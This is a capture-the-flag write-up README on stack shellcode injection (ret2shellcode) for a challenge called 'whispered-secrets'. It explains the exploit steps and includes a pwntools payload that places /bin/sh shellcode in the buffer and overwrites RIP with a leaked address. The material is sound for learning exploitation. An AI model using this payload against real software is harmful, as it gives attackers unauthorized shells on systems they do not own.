# Shellcode Injection

Challenges where NX (No-eXecute) is disabled, making the stack executable. Instead of redirecting execution to existing code, arbitrary machine code is injected directly into the buffer and the saved RIP is overwritten with the buffer's runtime address.

## Challenges

| challenge | technique | key concept |
|---|---|---|
| [whispered-secrets](whispered-secrets/) | ret2shellcode | NX off; printf leaks the buffer address at runtime; shellcraft.sh() injected at buf[0]; RIP overwritten with leaked addr |

## Exploit Flow

1. **Receive the leak** — the binary prints the buffer address via `printf("secret: %p\n", buf)`. Parse this value.
2. **Build the payload** — place the shellcode at the start of the buffer, pad to the RIP offset, then overwrite RIP with the leaked address.
3. **Trigger** — the function returns, RIP jumps into the shellcode, `/bin/sh` executes.

```python
shellcode = asm(shellcraft.sh())
payload = flat(
    shellcode,
    b'A' * (OFFSET_TO_RIP - len(shellcode)),
    p64(buf_addr),
)
```

## Key Concepts

**Why a leak is required:** ASLR randomizes the stack address on every run. Without printing the buffer address at runtime, there is no reliable target to jump to.

**NX check:** `checksec` reports `NX: disabled` or shows a `RWX` segment. When NX is enabled this approach fails — use ret2libc or ROP instead.

**Shellcode generation with pwntools:**
```python
context.arch = 'amd64'
context.os   = 'linux'
shellcode = asm(shellcraft.sh())   # generates execve("/bin/sh", NULL, NULL)
```

**Offset measurement:** standard cyclic pattern method. For `whispered-secrets` the offset is 136 bytes (128-byte buffer + 8-byte saved RBP).
